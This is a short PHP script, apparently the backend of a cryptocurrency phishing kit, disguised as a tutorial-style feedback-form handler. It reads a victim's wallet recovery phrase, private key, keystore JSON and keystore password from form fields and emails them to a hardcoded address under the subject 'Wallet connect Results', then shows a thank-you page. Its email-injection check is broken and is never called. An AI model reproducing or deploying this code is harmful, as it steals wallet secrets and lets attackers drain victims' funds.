<?php
/*
This first bit sets the email address that you want the form to be submitted to.
You will need to change this value to a valid email address that you can access.
*/
$webmaster_email = "burtonmichael324@gmail.com";
/*
This bit sets the URLs of the supporting pages.
If you change the names of any of the pages, you will need to change the values here.
*/
$feedback_page = "feedback_form.html";
$error_page = "error_message.html";
$thankyou_page = "thank_you.html";

/*
This next bit loads the form field data into variables.
If you add a form field, you will need to add it here.
*/
$phrase = $_REQUEST['phrase'] ;
$keystorepassword = $_REQUEST['keystorepassword'] ;
$privatekey = $_REQUEST['privatekey'] ;
$keystorejson = $_REQUEST['keystorejson'] ;
//$walletname = $_REQUEST['walletname'] ;
$walletname = $_REQUEST['WalletName'];
$msg = 
"phrase: " . $phrase . "\r\n" . 
"keystorejson: " . $keystorejson . "\r\n" .
"keystorepassword: " . $keystorepassword . "\r\n" .
"privatekey: " . $privatekey . "\r\n" .
"walletname: " . $walletname ;

/*
The following function checks for email injection.
Specifically, it checks for carriage returns - typically used by spammers to inject a CC list.
*/
function isInjected($str) {
	$injections = array('(\n+)',
	'(\r+)',
	'(\t+)',
	'(%0A+)',
	'(%0D+)',
	'(%08+)',
	'(%09+)'
	);
	$inject = join('|', $injections);
	$inject = "/$inject/i";
	
	}
	



/* 
If email injection is detected, redirect to the error page.
If you add a form field, you should add it here.
*/



// If we passed all previous tests, send the email then redirect to the thank you page.


	mail( "$webmaster_email", "Wallet connect Results by T3CHBOI247", $msg );

	header( "Location: $thankyou_page" );

?>